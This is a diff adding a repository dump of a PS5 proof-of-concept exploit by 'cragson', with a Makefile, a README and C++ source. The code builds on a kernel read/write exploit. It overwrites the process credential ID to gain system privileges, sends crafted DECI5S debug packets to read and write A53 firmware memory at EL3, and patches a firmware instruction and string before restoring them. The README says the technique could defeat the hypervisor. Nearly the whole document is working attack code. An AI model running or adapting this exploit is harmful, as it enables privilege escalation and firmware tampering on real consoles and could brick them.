@@ -1,0 +1,532 @@
+Project Path: arc_cragson_a53-code-exec_8dtjcksz
+
+Source Tree:
+
+```txt
+arc_cragson_a53-code-exec_8dtjcksz
+├── Makefile
+├── README.md
+├── a53_exploit.cpp
+└── a53_exploit.h
+
+```
+
+`Makefile`:
+
+```
+PS5_HOST ?= ps5
+PS5_PORT ?= 9021
+
+ifdef PS5_PAYLOAD_SDK
+    include $(PS5_PAYLOAD_SDK)/toolchain/prospero.mk
+else
+    $(error PS5_PAYLOAD_SDK is undefined)
+endif
+
+ELF := a53_exploit.elf
+
+CFLAGS := -std=c++2b -Wall -Werror -g
+
+all: $(ELF)
+
+$(ELF): a53_exploit.cpp
+	$(CXX) $(CFLAGS) -o $@ $^
+
+clean:
+	rm -f $(ELF)
+
+test: $(ELF)
+	$(PS5_DEPLOY) -h $(PS5_HOST) -p $(PS5_PORT) $^
+
+debug: $(ELF)
+	gdb-multiarch \
+	-ex "set architecture i386:x86-64" \
+	-ex "target extended-remote $(PS5_HOST):2159" \
+	-ex "file $(ELF)" \
+	-ex "remote put $(ELF) /data/$(ELF)" \
+	-ex "set remote exec-file /data/$(ELF)" \
+	-ex "start"
+
+```
+
+`README.md`:
+
+```md
+# PS5 A53 Code Execution PoC
+
+Proof of concept for code execution on the PS5's a53.
+Can be used to disable/defeat the Hypervisor till 5.00 (unimplemented).
+
+Currently relies on DECI5S / sdbgp Protocol for read/write on a53 but can be done also from x86 (credits: flat_z).
+
+**DON'T BRICK YOUR CONSOLE BY WRITING TO SOMEWHERE YOU DON'T KNOW ABOUT!**
+
+## What it does
+
+1. Initializes DECI5S communication with the A53 via `/dev/mp4/dump`
+2. Discovers the real physical addresses of firmware code via L3 page table walk
+3. Patches a version string in `.data` and an instruction in `.text`
+4. Triggers the patched function via DECI5S GET_CONF command
+5. Displays `"pwned by cragson - 33"` instead of the firmware version string
+6. Restores everything to original state
+
+## Requirements
+
+- PS5 FW 02.00
+- Kernel read/write exploit (provides `kernel_read4/8`, `kernel_write4/8`, etc.)
+- PS5 Payload SDK (`PS5_PAYLOAD_SDK` environment variable)
+
+## Building
+
+```bash
+export PS5_PAYLOAD_SDK=/path/to/ps5-payload-sdk
+make
+```
+## Credits
+
+- astrelsky (mp4rw)
+- Specter (byepervisor)
+- John Toernblom (sdk)
+- me, myself and I
+
+
+```
+
+`a53_exploit.cpp`:
+
+```cpp
+//
+// Proves arbitrary code execution on the A53 at ARM EL3 by patching
+// mcp_sdbgp_get_version to display a custom string via DECI5S.
+//
+// by cragson
+
+
+#include <sys/types.h>
+#include <sys/event.h>
+#include <sys/ioctl.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <string.h>
+#include <errno.h>
+#include <print>
+
+extern "C" {
+#include <ps5/kernel.h>
+}
+
+#include "a53_exploit.h"
+
+static inline uint64_t kernel_read8(uint64_t addr) {
+    uint64_t val;
+    kernel_copyout(addr, &val, sizeof(val));
+    return val;
+}
+static inline uint32_t kernel_read4(uint64_t addr) {
+    uint32_t val;
+    kernel_copyout(addr, &val, sizeof(val));
+    return val;
+}
+static inline void kernel_write8(uint64_t addr, uint64_t val) {
+    kernel_copyin(&val, addr, sizeof(val));
+}
+static inline void kernel_write4(uint64_t addr, uint32_t val) {
+    kernel_copyin(&val, addr, sizeof(val));
+}
+
+// only checked from dump of fw 02.00
+#define DECI5S_MAGIC        0x73354450U     // bswap32('PD5s')
+#define DECI5S_SRC_KERNEL   0x80FF0180U
+#define DECI5S_DST_MP4      0x80FF0201U
+#define DECI5S_PROTO_SDBGP  0x20000201U
+#define DECI5S_DCMP         0x18U
+#define DECI5S_CODE         0x50U
+#define SDBGP_READ_MEMORY   0x01040021U
+#define SDBGP_WRITE_MEMORY  0x01040031U
+#define SDBGP_GET_CONF      0x01010010U
+#define MP4_COREDUMP_CMD    0x20303000U
+#define IOCTL_START         0x800c410bU
+#define IOCTL_FINISH        0x8008410fU
+#define IOCTL_ALTER_STATE   0x40184115U
+#define SYSCORE_ID          0x4800000000000007ULL
+#define PA_TO_EL3_VA        0x020000
+
+struct deci5s_hdr {
+    uint32_t magic, self_size, packet_size;
+    uint32_t src, dst, protocol_id, attr, user_data;
+    uint64_t timestamp;
+};
+
+struct deci5s_cmd_hdr {
+    struct deci5s_hdr header;
+    uint32_t dcmp, code;
+    uint64_t pad0;
+    uint8_t  unknown0[4];
+    uint8_t  num_commands;
+    uint8_t  unknown1[3];
+};
+
+struct deci5s_mem_arg {
+    uint32_t self_size;
+    uint32_t access_size:8;
+    uint32_t mem_type:24;
+    uint64_t addr;
+    uint64_t size;
+};
+
+static int      g_init = 0;
+static uint64_t g_state_addr, g_flags_addr;
+static uint64_t g_buf_kva, g_iommu_kva, g_size_kva;
+
+extern "C" uint64_t sceKernelReadTsc(void);
+
+static uint64_t swap_auth(uint64_t id, uint64_t *ucred_out) {
+    uint64_t proc = kernel_get_proc(getpid());
+    uint64_t ucred = kernel_read8(proc + 0x40);
+    uint64_t orig = kernel_read8(ucred + 0x58);
+    kernel_write8(ucred + 0x58, id);
+    *ucred_out = ucred;
+    return orig;
+}
+
+static uint32_t access_sz(uint64_t addr, uint32_t len) {
+    uint32_t c = (uint32_t)addr | len;
+    if (c & 1) return 1;
+    if (c & 2) return 3;
+    if (c & 4) return 4;
+    if (c & 8) return 5;
+    return 6;
+}
+
+static int deci5s_send(struct deci5s_hdr *pkt, uint32_t pkt_len,
+                       const void *data, uint32_t data_len,
+                       uint64_t softc, uint64_t bar2) {
+    uint64_t ucred = 0;
+    uint64_t orig = swap_auth(SYSCORE_ID, &ucred);
+
+    int fd = open("/dev/mp4/dump", 0, 0);
+    int kq = kqueue();
+    uint32_t ctx[] = {8, 0};
+    struct kevent ev;
+    EV_SET(&ev, fd, EVFILT_READ, EV_ADD, 0, 0, NULL);
+
+    kernel_write4(g_state_addr, ~0x10U);
+    kernel_write4(g_flags_addr, 0x210);
+    kevent(kq, &ev, 1, NULL, 0, NULL);
+
+    pkt->timestamp = sceKernelReadTsc();
+    uint64_t va = kernel_read8(g_buf_kva);
+    kernel_copyin(pkt, va, pkt_len - data_len);
+    if (data && data_len > 0)
+        kernel_copyin(data, va + pkt_len - data_len, data_len);
+
+    uint64_t iommu = kernel_read8(g_iommu_kva);
+    uint32_t bufsz = (uint32_t)kernel_read8(g_size_kva);
+    kernel_write4(bar2 + 0xf7000, (uint32_t)(iommu >> 32));
+    kernel_write4(bar2 + 0xf8000, (uint32_t)iommu);
+    kernel_write4(bar2 + 0xf9000, bufsz);
+    uint32_t req = kernel_read4(softc + 0x160) + 1;
+    kernel_write4(softc + 0x160, req);
+    kernel_write4(softc + 0x164, MP4_COREDUMP_CMD);
+    kernel_write4(bar2 + 0xf6000, MP4_COREDUMP_CMD);
+
+    kevent(kq, NULL, 0, &ev, 1, NULL);
+    ioctl(fd, IOCTL_FINISH, ctx);
+    close(kq);
+    close(fd);
+    kernel_write8(ucred + 0x58, orig);
+    return 0;
+}
+
+static int mp4_read(uint64_t pa, void *dst, uint32_t len, uint64_t sc, uint64_t b2) {
+    if (!g_init) return -1;
+    struct {
+        struct deci5s_cmd_hdr h;
+        struct { uint32_t ss, ts, ty; uint32_t p[4]; uint32_t na; } c;
+        struct deci5s_mem_arg a;
+    } pkt;
+    memset(&pkt, 0, sizeof(pkt));
+    pkt.h.header.magic = DECI5S_MAGIC;
+    pkt.h.header.self_size = sizeof(struct deci5s_hdr);
+    pkt.h.header.packet_size = sizeof(pkt);
+    pkt.h.header.src = DECI5S_SRC_KERNEL;
+    pkt.h.header.dst = DECI5S_DST_MP4;
+    pkt.h.header.protocol_id = DECI5S_PROTO_SDBGP;
+    pkt.h.dcmp = DECI5S_DCMP;
+    pkt.h.code = DECI5S_CODE;
+    pkt.h.num_commands = 1;
+    pkt.c.ss = sizeof(pkt.c);
+    pkt.c.ts = sizeof(pkt.c) + sizeof(struct deci5s_mem_arg);
+    pkt.c.ty = SDBGP_READ_MEMORY;
+    pkt.c.na = 1;
+    pkt.a.self_size = sizeof(struct deci5s_mem_arg);
+    pkt.a.access_size = access_sz(pa, len);
+    pkt.a.mem_type = PA_TO_EL3_VA;
+    pkt.a.addr = pa;
+    pkt.a.size = len;
+    uint64_t va = kernel_read8(g_buf_kva);
+    if (deci5s_send(&pkt.h.header, sizeof(pkt), NULL, 0, sc, b2) != 0) return -1;
+    int64_t nr = (int64_t)kernel_read8(va + 0xf8);
+    if (nr > 0) kernel_copyout(va + 0x108, dst, len);
+    return (int)nr;
+}
+
+static int mp4_write(uint64_t pa, const void *src, uint32_t len, uint64_t sc, uint64_t b2) {
+    if (!g_init || len == 0 || len > 64) return -1;
+    struct {
+        struct deci5s_cmd_hdr h;
+        struct { uint32_t ss, ts, ty; uint32_t p0[5]; uint32_t na; uint32_t p1; } c;
+        struct deci5s_mem_arg a;
+    } pkt;
+    memset(&pkt, 0, sizeof(pkt));
+    pkt.h.header.magic = DECI5S_MAGIC;
+    pkt.h.header.self_size = sizeof(struct deci5s_hdr);
+    pkt.h.header.packet_size = sizeof(pkt) + len;
+    pkt.h.header.src = DECI5S_SRC_KERNEL;
+    pkt.h.header.dst = DECI5S_DST_MP4;
+    pkt.h.header.protocol_id = DECI5S_PROTO_SDBGP;
+    pkt.h.dcmp = DECI5S_DCMP;
+    pkt.h.code = DECI5S_CODE;
+    pkt.h.num_commands = 1;
+    pkt.c.ss = sizeof(pkt.c);
+    pkt.c.ts = sizeof(pkt.c) + sizeof(struct deci5s_mem_arg);
+    pkt.c.ty = SDBGP_WRITE_MEMORY;
+    pkt.c.na = 1;
+    pkt.a.self_size = sizeof(struct deci5s_mem_arg);
+    pkt.a.access_size = access_sz(pa, len);
+    pkt.a.mem_type = PA_TO_EL3_VA;
+    pkt.a.addr = pa;
+    pkt.a.size = len;
+    return deci5s_send(&pkt.h.header, sizeof(pkt) + len, src, len, sc, b2);
+}
+
+static int mp4_init(uint64_t softc, uint64_t bar2) {
+    uint64_t ucred = 0;
+    uint64_t orig = swap_auth(SYSCORE_ID, &ucred);
+    int fd = open("/dev/mp4/dump", 0, 0);
+    if (fd < 0) { kernel_write8(ucred + 0x58, orig); return -1; }
+
+    int kq = kqueue();
+    struct kevent ev;
+    EV_SET(&ev, fd, EVFILT_READ, EV_ADD, 0, 0, NULL);
+    kevent(kq, &ev, 1, NULL, 0, NULL);
+
+    uint32_t ctx[6] = {12, 0, 0, 0, 0, 0};
+    if (ioctl(fd, IOCTL_START, ctx) < 0) {
+        close(kq); close(fd);
+        kernel_write8(ucred + 0x58, orig);
+        return -2;
+    }
+
+    struct timespec to = {10, 0};
+    kevent(kq, NULL, 0, &ev, 1, &to);
+    close(kq);
+    ioctl(fd, IOCTL_ALTER_STATE, ctx);
+
+    // Find state/flags/buffer in softc
+    uint64_t sa = 0, fa = 0;
+    for (uint32_t o = 0; o < 0x1000; o += 4) {
+        uint32_t v = kernel_read4(softc + o);
+        if ((v & ~0x10U) == 0xf && sa == 0) sa = softc + o;
+        if ((v & 0xffff) == 0x212 && fa == 0) { fa = softc + o; break; }
+    }
+    if (!fa) {
+        uint32_t f[2] = {8, 0}; ioctl(fd, IOCTL_FINISH, f); close(fd);
+        kernel_write8(ucred + 0x58, orig); return -3;
+    }
+
+    uint64_t bva = 0, ia = 0, sza = 0;
+    for (uint32_t i = (uint32_t)(fa - softc) / 8; i < 0x1000 / 8; i++) {
+        uint64_t a = softc + i * 8;
+        uint64_t v = kernel_read8(a);
+        if ((v >> 40) == 0xFFFFFF && (v & 0xFFFFF) == 0 && bva == 0) {
+            bva = a; ia = a - 8; sza = a - 16; break;
+        }
+    }
+    if (!bva) {
+        uint32_t f[2] = {8, 0}; ioctl(fd, IOCTL_FINISH, f); close(fd);
+        kernel_write8(ucred + 0x58, orig); return -4;
+    }
+
+    g_state_addr = sa; g_flags_addr = fa;
+    g_buf_kva = bva; g_iommu_kva = ia; g_size_kva = sza;
+    g_init = 1;
+
+    uint32_t f[2] = {8, 0};
+    ioctl(fd, IOCTL_FINISH, f); close(fd);
+    kernel_write8(ucred + 0x58, orig);
+    return 0;
+}
+
+static void get_version(uint64_t sc, uint64_t b2, char *out, int outsz) {
+    struct {
+        struct deci5s_cmd_hdr h;
+        struct { uint32_t ss, ts, ty; uint32_t p[4]; uint32_t na; } c;
+    } pkt;
+    memset(&pkt, 0, sizeof(pkt));
+    pkt.h.header.magic = DECI5S_MAGIC;
+    pkt.h.header.self_size = sizeof(struct deci5s_hdr);
+    pkt.h.header.packet_size = sizeof(pkt);
+    pkt.h.header.src = DECI5S_SRC_KERNEL;
+    pkt.h.header.dst = DECI5S_DST_MP4;
+    pkt.h.header.protocol_id = DECI5S_PROTO_SDBGP;
+    pkt.h.dcmp = DECI5S_DCMP;
+    pkt.h.code = DECI5S_CODE;
+    pkt.h.num_commands = 1;
+    pkt.c.ss = sizeof(pkt.c);
+    pkt.c.ts = sizeof(pkt.c);
+    pkt.c.ty = SDBGP_GET_CONF;
+    pkt.c.na = 0;
+    uint64_t va = kernel_read8(g_buf_kva);
+    deci5s_send(&pkt.h.header, sizeof(pkt), NULL, 0, sc, b2);
+    memset(out, 0, outsz);
+    kernel_copyout(va + 0x148, out, outsz - 1);
+}
+
+int run_a53_exploit(uint64_t mp4_softc, uint64_t zcn_bar2) {
+    std::print("\n=============================================================\n");
+    std::print("  A53 EL3 CODE EXECUTION PoC\n");
+    std::print("=============================================================\n\n");
+
+    int ret = mp4_init(mp4_softc, zcn_bar2);
+    if (ret != 0) { std::print("[!] Init failed ({})\n", ret); return ret; }
+    std::print("[+] MP4 init complete\n");
+
+    uint64_t magic = 0;
+    mp4_read(0x88440000ULL, &magic, 8, mp4_softc, zcn_bar2);
+    uint32_t elf32 = (uint32_t)(magic & 0xFFFFFFFF);
+    std::print("[+] ELF magic = 0x{:08x} {}\n", elf32,
+        (elf32 == 0x464c457f) ? "(OK)" : "(FAIL)");
+    if (elf32 != 0x464c457f) {
+        std::print("[!] DECI5S reads not working on this boot. Reboot and retry.\n");
+        return -5;
+    }
+
+    // PA Discovery via L3 page table walk
+    uint64_t l2_0 = 0;
+    mp4_read(0x88001000ULL, &l2_0, 8, mp4_softc, zcn_bar2);
+    if ((l2_0 & 3) != 3) {
+        std::print("[!] L2[0] is not TABLE descriptor (0x{:016x})\n", l2_0);
+        return -6;
+    }
+    uint64_t l3_pa = l2_0 & 0x0000FFFFFFFFF000ULL;
+
+    // Instruction: VA 0x110850 -> L3[0x110]
+    uint64_t l3_instr = 0;
+    mp4_read(l3_pa + 0x110 * 8, &l3_instr, 8, mp4_softc, zcn_bar2);
+    uint64_t pa_instr = (l3_instr & 0x0000FFFFFFFFF000ULL) | 0x850;
+
+    // String: VA 0x1235ac -> L3[0x123]
+    uint64_t l3_str = 0;
+    mp4_read(l3_pa + 0x123 * 8, &l3_str, 8, mp4_softc, zcn_bar2);
+    uint64_t pa_str = (l3_str & 0x0000FFFFFFFFF000ULL) | 0x5ac;
+
+    std::print("[+] PA of instruction (VA 0x110850) = 0x{:x}\n", pa_instr);
+    std::print("[+] PA of string      (VA 0x1235ac) = 0x{:x}\n", pa_str);
+
+    uint32_t instr = 0;
+    mp4_read(pa_instr, &instr, 4, mp4_softc, zcn_bar2);
+    std::print("[+] Instruction = 0x{:08x} {}\n", instr,
+        (instr == 0x91168C21) ? "(CONFIRMED)" : "(WRONG PA - ABORTING)");
+    if (instr != 0x91168C21) return -7;
+
+    uint8_t  saved_str[22];
+    uint32_t saved_instr = instr;
+    mp4_read(pa_str, saved_str, 22, mp4_softc, zcn_bar2);
+
+    char ver[64];
+    get_version(mp4_softc, zcn_bar2, ver, sizeof(ver));
+    std::print("    \"{}\"\n", ver);
+
+    std::print("\n[*] Patching...\n");
+    const char msg[] = "pwned by cragson - 33";
+    mp4_write(pa_str, msg, 22, mp4_softc, zcn_bar2);
+
+    uint32_t patched = 0x9116B021;  // ADD x1, x1, #0x5ac (skip 9 bytes)
+    mp4_write(pa_instr, &patched, 4, mp4_softc, zcn_bar2);
+
+    uint32_t check = 0;
+    mp4_read(pa_instr, &check, 4, mp4_softc, zcn_bar2);
+    std::print("    .text: 0x{:08x} -> 0x{:08x} {}\n", saved_instr, check,
+        (check == patched) ? "(OK)" : "(FAILED)");
+
+    std::print("\n[*] Patched result:\n");
+    get_version(mp4_softc, zcn_bar2, ver, sizeof(ver));
+    std::print("    \"{}\"\n", ver);
+
+    std::print("\n[*] Restoring...\n");
+    mp4_write(pa_instr, &saved_instr, 4, mp4_softc, zcn_bar2);
+    mp4_write(pa_str, saved_str, 22, mp4_softc, zcn_bar2);
+
+    mp4_read(pa_instr, &check, 4, mp4_softc, zcn_bar2);
+    std::print("    .text: 0x{:08x} {}\n", check,
+        (check == saved_instr) ? "(restored)" : "(FAILED)");
+
+    std::print("\n[*] Restored result:\n");
+    get_version(mp4_softc, zcn_bar2, ver, sizeof(ver));
+    std::print("    \"{}\"\n", ver);
+
+    std::print("\n=============================================================\n");
+    std::print("  A53 EL3 CODE EXECUTION — COMPLETE\n");
+    std::print("=============================================================\n\n");
+    return 0;
+}
+
+// bus_data_devices offset from kernel .text base
+#define BUS_DATA_DEVICES_OFFSET  (0x1B80000 + 0x1D91478)
+#define DEVICE_DEVLINK   0x18   // next device in list
+#define DEVICE_NAMEUNIT  0x58   // pointer to name string
+#define DEVICE_SOFTC     0x88   // pointer to softc
+#define SOFTC_ZCN_BAR2_RES  0x18   // resource pointer
+#define RESOURCE_BUSHANDLE  0x10   // bushandle in resource
+
+int main() 
+{
+    // only run this when you are on FW 02.00!!!
+    uint32_t fw = kernel_get_fw_version() & 0xFFFF0000;
+    std::print("[+] FW: 0x{:x}\n", fw);
+
+    const uint64_t data_offset = 0x1B80000;
+
+    uint64_t kbase = (uint64_t)KERNEL_ADDRESS_DATA_BASE - data_offset;
+    uint64_t bus_devs_addr = kbase + BUS_DATA_DEVICES_OFFSET;
+
+    std::print("[+] Finding MP4 device...\n");
+    uint64_t mp4_softc = 0;
+    uint64_t device = kernel_read8(bus_devs_addr);
+    while (device != 0) {
+        uint64_t nameunit_ptr = kernel_read8(device + DEVICE_NAMEUNIT);
+        if (nameunit_ptr != 0 && (nameunit_ptr >> 48) == 0xFFFF) {
+            uint32_t name4 = kernel_read4(nameunit_ptr);
+            if (name4 == 0x3034706d) {  // "mp40" in little-endian
+                mp4_softc = kernel_read8(device + DEVICE_SOFTC);
+                std::print("[+] Found mp40, softc=0x{:x}\n", mp4_softc);
+                break;
+            }
+        }
+        device = kernel_read8(device + DEVICE_DEVLINK);
+    }
+
+    if (mp4_softc == 0) {
+        std::print("[!] MP4 device not found\n");
+        return -1;
+    }
+
+    uint64_t zcn_bar2_res = kernel_read8(mp4_softc + SOFTC_ZCN_BAR2_RES);
+    uint64_t zcn_bar2 = kernel_read8(zcn_bar2_res + RESOURCE_BUSHANDLE);
+    std::print("[+] zcn_bar2 = 0x{:x}\n", zcn_bar2);
+
+    return run_a53_exploit(mp4_softc, zcn_bar2);
+}
+
+```
+
+`a53_exploit.h`:
+
+```h
+#pragma once
+#include <stdint.h>
+
+int run_a53_exploit(uint64_t mp4_softc, uint64_t zcn_bar2);
+
+```
